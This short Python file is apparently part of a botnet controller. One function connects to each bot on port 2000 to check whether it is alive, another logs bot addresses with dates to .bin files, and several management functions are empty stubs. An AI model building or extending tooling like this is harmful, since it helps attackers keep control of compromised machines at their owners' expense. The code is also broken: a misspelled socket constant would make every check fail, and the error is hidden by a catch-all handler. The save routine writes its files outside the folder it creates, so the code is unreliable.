import socket
import os
import time

def check_bot(bot_addr):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREM)
        s.connect((bot_addr,2000))
        resp = s.recv(1024).decode()
        if(resp == "ALIVE"):
            s.send("OK".encode())
            print("[*] %s : Active"%(bot_addr))
    except socket.error:
        print("[*] %s : Dead"%(bot_addr))
    except:
        print("[*] An unknown error has occured")
        pass


def remove_bot(bot_addr):
    pass

def reload_botnet():
    pass

def filter_botnet():
    pass

def save_bot(bot_addr):             #Save botnet socket(BETA)
    dir_name = "Botnet_Database"
    if(os.path.isdir(dir_name) == False):
        os.mkdir(dir_name)
    if(os.path.isfile(str(bot_addr) + ".bin") == False):
        file = open(bot_addr+".bin",'w')
        file.close()
    
    cur_time_details = time.gmtime(time.time())
    month = cur_time_details.tm_mon
    day = cur_time_details.tm_mday
    time_fmt = f"Date : {day} Month : {month}"

    with open(bot_addr+".bin",'a') as f:
        f.write(time_fmt)
    